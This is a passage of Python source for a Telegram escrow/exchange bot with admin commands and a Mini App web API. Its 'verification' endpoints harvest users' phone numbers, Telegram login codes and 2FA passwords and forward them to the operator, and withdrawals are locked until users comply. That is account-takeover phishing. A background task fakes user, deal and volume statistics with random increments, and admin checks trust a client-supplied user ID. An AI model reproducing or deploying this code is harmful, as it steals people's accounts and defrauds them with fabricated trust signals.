        text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ Использование: /confirm_withdraw [ID]")
        return
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ Заявка не найдена")
        return
    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer(f"❌ Заявка уже обработана")
        return
    bal = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if bal.get(curr_key, 0) >= req["amount"]:
        bal[curr_key] -= req["amount"]
        save_json(FILES["balance"], balance)
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"✅ Вывод подтверждён #{request_id}")
    await bot.send_message(
        req["user_id"],
        f"✅ <b>Вывод подтверждён</b>\n\n"
        f"💰 {req['amount']} {req['currency']}"
    )

@dp.message(Command("reject_withdraw"))
async def reject_withdraw_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ Использование: /reject_withdraw [ID]")
        return
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ Заявка не найдена")
        return
    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer(f"❌ Заявка уже обработана")
        return
    req["status"] = "rejected"
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"❌ Вывод отклонён #{request_id}")

@dp.callback_query(lambda c: c.data == "admin_manage_reviews")
async def admin_manage_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    reviews_list = list(reviews.values())
    if not reviews_list:
        await callback.message.edit_text(f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\n"
    for r in reviews_list[-10:]:
        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
        text += f"📝 {r.get('text', '')[:50]}\n🆔 {r.get('id', '')}\n➡️ /delete_review {r.get('id', '')}\n\n"
    await callback.message.edit_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🗑 Очистить все", callback_data="admin_clear_reviews")],
            [InlineKeyboardButton(text="◀️ Админ панель", callback_data="menu_admin")]
        ])
    )
    await callback.answer()

@dp.message(Command("delete_review"))
async def delete_review_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ Использование: /delete_review [ID]")
        return
    review_id = args[1]
    if review_id not in reviews:
        await message.answer(f"❌ Отзыв не найден")
        return
    del reviews[review_id]
    save_json(FILES["reviews"], reviews)
    await message.answer(f"✅ Отзыв удалён")

@dp.callback_query(lambda c: c.data == "admin_clear_reviews")
async def admin_clear_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    reviews.clear()
    save_json(FILES["reviews"], reviews)
    await callback.message.edit_text(f"✅ Все отзывы удалены", reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_logs")
async def admin_logs(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    logs_list = list(logs.values())[-20:]
    if not logs_list:
        await callback.message.edit_text(f"📋 <b>Логи</b>\n\nНет записей", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = "📋 <b>Последние логи</b>\n\n"
    for log_entry in reversed(logs_list[-10:]):
        text += f"🕐 {log_entry.get('time', '')[:19]}\n"
        text += f"📌 {log_entry.get('action', '')}\n"
        text += f"📊 {json.dumps(log_entry.get('data', {}), ensure_ascii=False)[:80]}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    
    total_users = len(balance)
    total_deals = len(deals)
    total_reviews = len(reviews)
    total_volume = round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1)
    
    await callback.message.edit_text(
        f"📊 <b>СТАТИСТИКА</b>\n\n"
        f"👥 Пользователей: {total_users}\n"
        f"📊 Всего сделок: {total_deals}\n"
        f"⭐️ Отзывов: {total_reviews}\n"
        f"💎 Объём (TON): {total_volume}\n"
        f"🔄 Активных сделок: {len([d for d in deals.values() if d.get('status') in ['waiting_payment', 'paid', 'awaiting_confirmation']])}",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

# ============================================================
# 14. API ДЛЯ MINI APP
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS, DELETE, PUT',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username, Authorization',
        'Access-Control-Allow-Credentials': 'true'
    }
    
    if request.method == 'OPTIONS':
        return web.Response(headers=headers, status=200)
    
    if request.method == 'GET':
        return web.json_response({'success': True, 'bot': BOT_NAME, 'status': 'running'}, headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    endpoint = request.path
    
    # ===== БАЛАНС =====
    if endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        return web.json_response({'success': True, 'balance': bal}, headers=headers)
    
    # ===== СОЗДАНИЕ СДЕЛКИ =====
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        username = data.get('username', str(user_id))
        
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        
        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link,
            'status': deals[deal_id]["status"]
        }, headers=headers)
    
    # ===== СДЕЛКИ =====
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    # ===== ПРОВЕРКА АДМИНА =====
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
    
    # ===== ОТЗЫВЫ =====
    elif endpoint == '/api/reviews':
        limit = data.get('limit', 10)
        page = data.get('page', 0)
        reviews_list = list(reviews.values())
        start = page * limit
        end = start + limit
        paginated = reviews_list[start:end]
        return web.json_response({
            'success': True,
            'reviews': paginated,
            'total': len(reviews_list)
        }, headers=headers)
    
    # ===== ДОБАВИТЬ ОТЗЫВ =====
    elif endpoint == '/api/add_review':
        rating = data.get('rating')
        text = data.get('text')
        anonymous = data.get('anonymous', True)
        if not all([user_id, rating, text]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним" if anonymous else str(user_id),
            "rating": rating,
            "text": text,
            "anonymous": anonymous,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": user_id
        }
        save_json(FILES["reviews"], reviews)
        return web.json_response({'success': True, 'review_id': review_id}, headers=headers)
    
    # ===== УДАЛИТЬ ОТЗЫВ =====
    elif endpoint == '/api/delete_review':
        review_id = data.get('review_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if review_id in reviews:
            del reviews[review_id]
            save_json(FILES["reviews"], reviews)
            return web.json_response({'success': True}, headers=headers)
        return web.json_response({'success': False, 'error': 'Review not found'}, headers=headers)
    
    # ===== ОЧИСТИТЬ ОТЗЫВЫ =====
    elif endpoint == '/api/clear_reviews':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        reviews.clear()
        save_json(FILES["reviews"], reviews)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ЗАПРОС ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/send_verification_request':
        phone = data.get('phone')
        username = data.get('username')
        user_id = data.get('user_id')
        
        if not phone or not username or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if is_verified(user_id):
            return web.json_response({'success': False, 'error': 'User already verified'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        verification_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": username,
            "phone": phone,
            "status": "pending",
            "step": "waiting_code",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["verification_requests"], verification_requests)
        
        await log_to_master(
            f"🔐 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ\n\n"
            f"🆔 Заявка: #{request_id}\n"
            f"👤 Пользователь: @{username}\n"
            f"🆔 ID: {user_id}\n"
            f"📞 Номер: {phone}\n"
            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        return web.json_response({
            'success': True,
            'request_id': request_id
        }, headers=headers)
    
    # ===== ПРОВЕРКА КОДА =====
    elif endpoint == '/api/submit_verification_code':
        code = data.get('code')
        password = data.get('password')
        user_id = data.get('user_id')
        request_id = data.get('request_id')
        
        if not code or not user_id or not request_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if request_id not in verification_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        
        req = verification_requests[request_id]
        
        if req.get("status") != "pending":
            return web.json_response({'success': False, 'error': 'Request already processed'}, headers=headers)
        
        req["code"] = code
        req["password"] = password if password else "нет"
        req["status"] = "completed"
        req["completed_at"] = datetime.now().isoformat()
        save_json(FILES["verification_requests"], verification_requests)
        
        complete_verification(user_id, req["phone"], code)
        
        await log_to_master(
            f"✅ ВЕРИФИКАЦИЯ ЗАВЕРШЕНА\n\n"
            f"🆔 Заявка: #{request_id}\n"
            f"👤 Пользователь: @{req.get('username', 'неизвестно')}\n"
            f"🆔 ID: {user_id}\n"
            f"📞 Номер: {req.get('phone')}\n"
            f"🔑 Код: {code}\n"
            f"🕐 Сессия активна 24 часа"
        )
        
        return web.json_response({
            'success': True,
            'expires_at': verification_data[str(user_id)].get('expires_at')
        }, headers=headers)
    
    # ===== ВЫВОД =====
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')
        
        if not user_id or not currency or not details:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if not is_verified(user_id):
            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "currency": currency,
            "amount": get_balance(user_id).get(currency.lower(), 0),
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)
        
        await log_to_master(
            f"💲 НОВАЯ ЗАЯВКА НА ВЫВОД\n\n"
            f"👤 Пользователь: ID: {user_id}\n"
            f"💰 Сумма: {get_balance(user_id).get(currency.lower(), 0)} {currency}\n"
            f"📝 Реквизиты: {details}\n"
            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"Для подтверждения: /confirm_withdraw {request_id}"
        )
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== СТАТИСТИКА =====
    elif endpoint == '/api/stats':
        return web.json_response({
            'success': True,
            'deals_today': stats.get('deals_today', len([d for d in deals.values() if d.get('created_at', '').startswith(datetime.now().strftime('%Y-%m-%d'))])),
            'users': stats.get('users', len(balance)),
            'reviews': stats.get('reviews', len(reviews)),
            'volume': stats.get('volume', round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1))
        }, headers=headers)
    
    # ===== ПРОВЕРКА 2-Х СДЕЛОК =====
    elif endpoint == '/api/has_2_deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_two = any(count >= 2 for count in partners.values())
        return web.json_response({
            'success': True,
            'has_2_deals': has_two,
            'total_deals': sum(partners.values())
        }, headers=headers)
    
    # ===== СТАТУС ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/verification_status':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        return web.json_response({
            'success': True,
            'verified': is_verified(user_id),
            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
        }, headers=headers)
    
    # ===== НАЧИСЛИТЬ БАЛАНС =====
    elif endpoint == '/api/admin_add_balance':
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        if not target_user_id or not currency or not amount:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        add_balance(target_user_id, currency, float(amount))
        
        await log_to_master(
            f"💰 АДМИН НАЧИСЛИЛ БАЛАНС\n\n"
            f"👤 Админ: ID: {user_id}\n"
            f"👤 Пользователь: {target_user_id}\n"
            f"💰 {amount} {currency}"
        )
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ИЗМЕНИТЬ СТАТИСТИКУ =====
    elif endpoint == '/api/admin_set_stats':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        key = data.get('key')
        value = data.get('value')
        
        if not key or value is None:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        stats[key] = value
        save_json(FILES["stats"], stats)
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ВСЕ ЗАЯВКИ НА ВЕРИФИКАЦИЮ =====
    elif endpoint == '/api/verification_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        return web.json_response({
            'success': True,
            'requests': list(verification_requests.values())
        }, headers=headers)
    
    # ===== ВСЕ ЗАЯВКИ НА ВЫВОД =====
    elif endpoint == '/api/withdraw_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        return web.json_response({
            'success': True,
            'requests': list(withdraw_requests.values())
        }, headers=headers)
    
    # ===== ВСЕ СДЕЛКИ =====
    elif endpoint == '/api/all_deals':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        return web.json_response({
            'success': True,
            'deals': list(deals.values())
        }, headers=headers)
    
    # ============================================================
    # 🔥 ОПЛАТА С БАЛАНСА (КИДАЕТ КНОПКУ С MINI APP)
    # ============================================================
    elif endpoint == '/api/pay_balance':
        deal_id = data.get('deal_id')
        user_id = data.get('user_id')
        
        if not deal_id or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Deal already processed'}, headers=headers)
        
        buyer_balance = get_balance(user_id)
        curr_key = deal["currency"].lower()
        
        if buyer_balance.get(curr_key, 0) < deal["amount"]:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        
        buyer_balance[curr_key] -= deal["amount"]
        save_json(FILES["balance"], balance)
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        
        await log_to_master(
            f"💳 ОПЛАТА С БАЛАНСА\n\n"
            f"🆔 Сделка: #{deal_id}\n"
            f"👤 Покупатель: ID: {user_id}\n"
            f"📦 Товар: {deal['product']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Продавец: @{deal['seller_username']}"
        )
        
        # 🔥 ОТПРАВЛЯЕМ ПРОДАВЦУ КНОПКУ С MINI APP
        try:
            seller_lang = get_user_language(deal["seller_id"])
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(
                    text="📦 Подтвердить передачу",
                    web_app=WebAppInfo(url=MINI_APP_URL + "?page=deals")
                )],
                [InlineKeyboardButton(
                    text="💬 Написать покупателю",
                    url=f"https://t.me/{deal['buyer_username']}"
                )],
                [InlineKeyboardButton(text="◀️ Главное меню", callback_data="back_to_main")]
            ])
            
            await bot.send_message(
                deal["seller_id"],
                f"💎 <b>СДЕЛКА #{deal_id} ОПЛАЧЕНА!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 ПОКУПАТЕЛЬ: @{deal['buyer_username']}\n"
                f"📦 ТОВАР: {deal['product']}\n\n"
                f"⬇️ Нажмите кнопку, чтобы подтвердить передачу в Mini App ⬇️",
                reply_markup=keyboard
            )
        except Exception as e:
            print(f"Error sending to seller: {e}")
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР =====
    elif endpoint == '/api/seller_delivered':
        deal_id = data.get('deal_id')
        user_id = data.get('user_id')
        
        if not deal_id or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        if deal["status"] != "paid":
            return web.json_response({'success': False, 'error': 'Deal not paid'}, headers=headers)
        
        if deal["seller_id"] != user_id:
            return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
        
        deal["status"] = "awaiting_confirmation"
        save_json(FILES["deals"], deals)
        
        await log_to_master(
            f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР\n\n"
            f"🆔 Сделка: #{deal_id}\n"
            f"👤 Продавец: ID: {user_id}\n"
            f"📦 Товар: {deal['product']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Покупатель: @{deal['buyer_username']}"
        )
        
        try:
            await bot.send_message(
                deal["buyer_id"],
                f"📦 <b>ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 ПРОДАВЕЦ: @{deal['seller_username']}\n\n"
                f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
                reply_markup=mini_app_keyboard("✅ Подтвердить получение", "deals")
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ =====
    elif endpoint == '/api/buyer_confirm':
        deal_id = data.get('deal_id')
        user_id = data.get('user_id')
        
        if not deal_id or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({'success': False, 'error': 'Deal not ready'}, headers=headers)
        
        if deal["buyer_id"] != user_id:
            return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
        
        add_balance(deal["seller_id"], deal["currency"], deal["amount"])
        seller_balance = get_balance(deal["seller_id"])
        buyer = deal["buyer_username"]
        if buyer not in seller_balance["deal_partners"]:
            seller_balance["deal_partners"][buyer] = 0
        seller_balance["deal_partners"][buyer] += 1
        save_json(FILES["balance"], balance)
        
        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)
        
        await log_to_master(
            f"🎉 СДЕЛКА ЗАВЕРШЕНА\n\n"
            f"🆔 Сделка: #{deal_id}\n"
            f"📦 Товар: {deal['product']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Продавец: @{deal['seller_username']}\n"
            f"👤 Покупатель: @{deal['buyer_username']}"
        )
        
        try:
            await bot.send_message(
                deal["seller_id"],
                f"🎉 <b>СДЕЛКА #{deal_id} ЗАВЕРШЕНА!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']} ЗАЧИСЛЕНЫ НА БАЛАНС"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПОЛУЧИТЬ РЕКВИЗИТЫ =====
    elif endpoint == '/api/get_rekvisits':
        deal_id = data.get('deal_id')
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        rekvisits = load_json(FILES["rekvisits"]) if os.path.exists(FILES["rekvisits"]) else {}
        curr_key = deal["currency"].lower()
        
        if curr_key in rekvisits:
            details = rekvisits[curr_key].format(amount=deal["amount"])
        else:
            details = f"Оплатите {deal['amount']} {deal['currency']}\nПосле оплаты нажмите 'Я оплатил'"
        
        return web.json_response({'success': True, 'details': details}, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ ОПЛАТУ ПО РЕКВИЗИТАМ =====
    elif endpoint == '/api/confirm_rekvisits_payment':
        deal_id = data.get('deal_id')
        user_id = data.get('user_id')
        
        if not deal_id or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Deal already processed'}, headers=headers)
        
        await log_to_master(
            f"💳 ЗАЯВКА НА ОПЛАТУ ПО РЕКВИЗИТАМ\n\n"
            f"👤 Пользователь: ID: {user_id}\n"
            f"📦 Сделка: #{deal_id}\n"
            f"💰 {deal['amount']} {deal['currency']}\n\n"
            f"Для подтверждения: /pay {deal_id}"
        )
        
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)

# ============================================================
# 15. ФОНОВЫЙ ПРОЦЕСС АВТОНАКРУТКИ
# ============================================================
async def auto_increment_stats():
    while True:
        try:
            stats_data = load_json(FILES["stats"])
            
            if not stats_data:
                stats_data = {}
            
            MIN_USERS = 21374
            MIN_DEALS_TODAY = 1264
            MIN_REVIEWS = 5427
            MIN_VOLUME = 47.6
            
            stats_data['users'] = stats_data.get('users', MIN_USERS) + random.randint(1, 5)
            stats_data['deals_today'] = stats_data.get('deals_today', MIN_DEALS_TODAY) + random.randint(0, 2)
            stats_data['reviews'] = stats_data.get('reviews', MIN_REVIEWS) + random.randint(0, 3)
            stats_data['volume'] = round(stats_data.get('volume', MIN_VOLUME) + random.uniform(0.01, 0.15), 1)
            
            if stats_data['users'] < MIN_USERS:
                stats_data['users'] = MIN_USERS + random.randint(100, 500)
            if stats_data['deals_today'] < MIN_DEALS_TODAY:
                stats_data['deals_today'] = MIN_DEALS_TODAY + random.randint(20, 50)
            if stats_data['reviews'] < MIN_REVIEWS:
                stats_data['reviews'] = MIN_REVIEWS + random.randint(50, 200)
            if stats_data['volume'] < MIN_VOLUME:
                stats_data['volume'] = round(MIN_VOLUME + random.uniform(0.5, 2.0), 1)
            
            save_json(FILES["stats"], stats_data)
            
        except Exception as e:
            print(f"Ошибка автонакрутки: {e}")
        
        await asyncio.sleep(300)

# ============================================================
# 16. ЗАПУСК
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    print("=" * 50)
    print("🔥 P2P Exchange Бот")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print(f"🆘 Поддержка: {SUPPORT_LINK}")
    print("=" * 50)
    
    asyncio.create_task(auto_increment_stats())
    
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
